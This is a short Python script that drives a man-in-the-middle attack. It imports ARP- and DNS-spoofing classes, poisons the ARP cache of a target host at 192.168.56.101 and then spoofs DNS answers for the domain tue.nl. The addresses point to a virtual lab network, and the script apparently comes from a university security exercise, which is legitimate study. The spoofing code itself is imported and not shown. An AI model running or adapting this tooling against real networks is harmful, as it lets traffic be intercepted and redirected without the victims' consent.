from src import arp_spoof as arp
from src import dns_spoof as dns
from scapy.arch import get_if_list

if __name__ == '__main__':
    interfaces = get_if_list()
    print(interfaces)
    arp_spoofing = arp.ARPSpoofing(
        interface=interfaces[2],
        target_mac="08:00:27:b7:c4:af",
        target_ip="192.168.56.101",
        spoofed_ips=["192.168.56.102"],
        delay=3
    )
    input("Press [enter] to start ARP spoofing")
    arp_spoofing.start()
    input("Press [enter] to start DNS spoofing")
    dns_spoofing = dns.DNSSpoofing(
        interface="enp0s3",
        domain_names=["tue.nl"],
        victims=[],
        redirect_ip=""
    )
    dns_spoofing.start()
    input("Press [enter] to stop DNS spoofing")
    dns_spoofing.stop()
    input("Press [enter] to stop ARP spoofing")
    arp_spoofing.stop()
